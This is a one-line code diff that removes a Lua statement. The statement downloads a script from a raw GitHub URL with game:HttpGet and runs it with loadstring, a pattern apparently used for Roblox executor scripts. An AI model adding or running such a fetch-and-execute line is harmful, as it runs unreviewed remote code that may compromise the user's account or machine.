@@ -1,1 +1,0 @@
-loadstring(game:HttpGet("https://raw.githubusercontent.com/iliekmen/dancing-guy-213/main/outttttttttttttttttttttttttttttttttttttttttttttttttttttttt"))()
